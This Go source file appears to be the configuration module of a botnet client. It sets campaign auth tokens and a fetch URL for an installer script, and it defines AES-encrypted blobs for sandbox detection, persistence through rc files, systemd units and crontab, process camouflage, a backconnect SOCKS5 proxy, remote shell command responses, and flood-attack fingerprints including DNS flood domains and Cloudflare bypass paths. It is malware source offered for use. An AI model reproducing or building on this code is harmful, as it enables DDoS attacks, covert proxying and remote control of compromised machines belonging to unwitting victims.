package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "3c05c936" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "6w#3Q$pES%9ziMRX" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "proto59" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("01e182a87dfb469bb7cd0e8364534a555607cfdf5238ca7d0041c4946909e9345709810fe5b4859bd54d82bb") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("04a2b9149b7da9f77b344803308917b1181bfbe23978036ade74db8f854d5e9ae986018ff491a79dd1c610d64dc68f7f8ac7331c0ba863dcf13b07ef07b37ce2bebc1581be7b0014eab2132648212ff063cc1ee705b622a350c92c3a34e13b1a8c6306be660085cd903fb637ec85775c5c724de048")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("293a8aafe6f6356072101073db158d35358194d3e0c525f3322d2233606e0185965738bfea21345d01b9c77873ccb6a1d65e4471c1dd960e41f9352baef523dc75b835a4e931167f2f44")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("e99deb09aec9a35844b7137915856a4d38ddbb677427f49b7afca31920546efa")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("76b8ef47baef0ba681f36deaa7b6b8ed276f367a305c66c9475416056b")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("e99be6a4fc5d9d6d054c645e1987d98813639c98d190edba111260e57fa6283167da61f5bb")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("31db4084f831365b3ab7c593919a68b876e98be120e01728a41fd13e55a8d9")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("f35f48dc1a378c6a3ae0cff2668a933684f87d0c3762ac17956571aab0")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("e7ab0d3125bc0c31e3ce18433fd96f07fc5293f2aee2dc0d5d4febc089add29704e0d2b6eacf04239dbf7227f75f880140c6eafa8963fa")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("a7796aaa04260922e80665904fb1ad2c92bc1aeadf2f0be3d627413e6cb35309ca620f")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("c0f5249fdedb6efaaeb12889b2a5597bbee97f8998813b38cc263b351052b5f6b3da7a8434f84eecbebddb0805f49d450fad30a8d1983ffd4a3a65ef2084db941c494e032bf549bf945248c9aaa4300094e1c829bcfd51af7fdf63939434bd3433a424670d32d26b7eafb0f5c0b44896717852ca737a7f49644cc21f130ab1b67c88d6f91e5e3a594bfa793baa121ec11a6555a82dc94b8ae379d081741b24e5339924665717570d08bd47e68aa0eab6045248b7ec1eb2ceab0f19898e736a0d98b4224cb27adf341f351a90746f4b")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("3141131f8b882185d3fffbbc8605b85fc2cfa16abc23d0269826cf4b1943a40ef94e7d525735d012d0dafa5bbcc718b34763d9994676c5a3b61dc57361735ca650221342e5cb60918af18309cc5fa8fec2e3081c1bc7bac88ccf565dcc602f7a415fa7b20e73b7579ba2e7e7c967b51aa1ac031417533e78eac3d1d6d51678c4576d03581b0403c1b35423b832d8d8999dd4c0cbf4548648fbbca2e661ae579a97a56cc5357373e980504cf88b3a62388ed30a1b8df1488a55f192f6a9f423678c53847d7946")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("6e7089ecd3f4db24d236ec03ac314a85d3a19bc9bdf4ac2589")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("f005e8931b2ec71e7345331687ccb284a32666d0ab354448ea0237a24a")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("fcd6e57bc656ad612f0ccdefc54f71a97370c38c7016ccddab592d2ad83169bd5f75ac4657e1f8")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("bfbcb3287029f9d25402584ad6afcdfb62318df8c870b12d973c83ea28163d68f226b41f9a07df56565650")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("894afbed3f3117d931e014e0aab7d2808aeede614ff9acf768eb9736dc855a")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("389847f19e6e0f1a9761ff68b2241fc4e88c65bb80c3137aa9ae6b50")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("f92e1e01966cc3c937c1de3e7c9e3a8541c716db6fb7ebe3024dbd71d222210d04b746691d7858a14e87f53a73e1cace")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("e8530bdc81f30de39e4552b31fa91089892e71a6")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("381baa7aff42fad9acd2857919c7d9d08194bba7d2")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("595772ba47b0cc27583b5c343c68b2d15d8ef877334ff8406a270f0a2225e2")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("c9006f9987134cc7f47036b21d0cf32d01e56d89ee737c3a6028")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("0dd40e2831367a7685b4769a1e2afa2d08f7cf8e87a34d8535f109")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("5c88b5125540b407b343992ce21ec5d67237a6a4fd0dc4dd0ec21c")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("e3ee5557d04c8356e5f0cf8ce824604f9660139bf7d7073bd5ece05463f5f3")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("da71ea198329d558026321de8e65ce279dba97c1f4806ce4a8fc2321b69fd86ea5359aded912a92f179b357938b0ac2b1c6f244140")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("d29cc35f5822f33487dfc167c8d760957961e26bd1ea1cd99f")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("b7369a2ced014b8ad2e327f007347004de10145be67faea581c0617c1b0f506130f3")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("3813f2140aeb92c7d9964f2d48396666dc12121b9af3ceb89179ad40e75c4a6ce9bf7641f11fb7b93f2b0c955910")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("89427251da9ebf2da07df40cd36d83dd8cdc9fb6bc93df7716e71d98c59beb7063f7845e99cabf56ccb074ea")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("6c0f14dbf91723598211d24fa5558a48e36d041598d4d43b3f49ef548ae899cc4005447b6d554799c8bb85401048600b5e7adb1f476b5357fe41")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("d194e82e8d179030c227acecc41c3297a37a3f873dd3e1e2627f11d5761f341e")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("9752c7d2bcb9234dd24e5b2b05eb25fa121dd27946aa9096bd8a6e384eb7f5c80a662e0397409a3608efa81b7d6f5a2c")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("99e81b1e7f02850d63cdb8f0882aa7e68c29895064a6e0f2fccb46de7fe809486a2b859899")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("415c9b4d3400095ae8fdf0e4c17fc26833e46ccea72c4cc8fdef18947509b366928f182114241904f79711d02b893e")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("32af634d73e01033ac526ef5d091249a59a226ccd01565dec050643c35ec28fea76d2138eb93e7d8db5146067f1d5b329d66083127f88505d265cc709e5f8c21f1ef43624b5ad77b3a26a76245a646e9ab9c0a17c6135dcc4bcafb7172cf38a8ab03e734e3bcaaa7a2b2bc18073b105ecf")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("fa23a224c727d3a438df453445551c1cb72b5760f67ff7b98744d4dcb6694435b6569944a47849144963c8a76225458c5b1bd91232ed10c089a049f9db88ddf07fe6579cb8e7afcf112d56d35f0dd22de0")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("b92006016af507c874dac2d34dfc1a006bd34d3fd51766664efab490fe3e287471c31fb63946756537a6620e6b38bf601f42ed7ef5ac2c5f2dd751cf23ef4459b028885665aff181072857a73f66")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("5568e6805630f69be57fbb7951f22a919ec56b9106407f114cf495dcdd283bbf08aa72ebc5143a46cf88a5247b8653a85411427e5d6bf565bbe76b3ce579fc3e6f734e381f103b4cc704727e87")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("318f98c8a2a64b88cefe2c83ed9c3ba10fe78fa901f977a0f0c2860e6e44fcbcd86c106c9da5ce737a39de63362271215448b7648e6162ac9c9fd8b04f6400")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("e1d4646026f5450bd9648d1610db4e31014ee521e69bb130a603604dbc1af2be960e5c62")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("a39898d0b6766070d9eb413194570198dfb34d3888e9cced85395e33e32aac4a2f60fde2e261e2150bd7e9f8c96e377d59451c30d1e49fb1bb1fd375b9b4d1b216a6cdd135051185e7b40357957385f95148c7c9ed210daa820e81339d993d988c4d139fc5a3a331f05a3873767a1ed1d59ea610eb0d86e756852f1bb4600c210468dc2a5c2c0ae8361e317aed3a570d08b256c49eab3a559c24f2b2f46f9beabf786b4569dde2577451c0c3be4564f24ac2b3cfb7cdf9260f8d2f96b579fde01c56f1de8f1f8535ecb9fbc8264f34ef7731fcc54676207ee5a0701eca")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("8146c7a7497751088c36c6affb0a1b8a92669ace7c04f6909d660383826a7300f8efe9a6568de3f1f642739fda03ac17a1e4a5aafc5ceb7478bda9457f6a0380b7d0308fd92c3108bc26a41be6ab290b364f94f36aba73e2fea46a")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("18e8839a675fecefeadb7650d5ac9094826d4a99d671a8827c31519bceb9f3efdd382c9775e3ed3b62baf188f6b00704c02652025b10f3399a3ea1")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("55fb2f15093e51993ad4550db754c101f572cda51aca2e33a739dfebfed846fd3af7114c72035cdc03df1ec89978f8637e18d70cf120777fec2e1fde6e2a4f4f968e9f9ab337856b31")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("0d1bebcc4ef33c32637cccdf0468836938080bbb14a191")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("dd1ca36aecce708626e17f45d53a3462bd0839eb620653ce344b3d4fcc7d8192a2b5")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("9902233f119f72ca30e52f997deacaeb30cb28452894062f897ae86f739835b1fcc47ee0a0ba9c12c3047f3d56715129843b2dcf44dbd20804e242d7acfbc1251393f325fbda578d8eaeb4668a6a0a647294cf5351c52db339104827936e67")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("05266581f53318d25833124e4123932c0617")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("1b04bdc44021e08f350a8ee31537add2111276dd757fef227b02d4b0db2011cd4900a510b4e27b2f60e84caba736fcbd4021f67f2f")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("a77bc1a226427fc897a3fcb1151b51c79091")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("0b9663ee5b9f0495a6124610f9e8ad45a5ea")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("38c15688c81a19919f2369cbf62c5b927b158388f655")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("c3606eb562aea53586c7563f2e485c1fe0f9f50a29adfc06")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("6dd4e480ba786186272601940ff9def5578eea0266")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("d6a851e77d535e0f19111a86aa698f653125")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("3a925eec12c1e7c8c7b113c098425f163ac4dce1b05d04b6e4")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("96f40da054f84420a79322cd4d454da0e8126702f08943815b")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("6bb2cd64ca6da6d715af9194be434006a1cbb30cb882db")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("50188ba335fc20bfde58fdabd4fb993dc93c111b")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
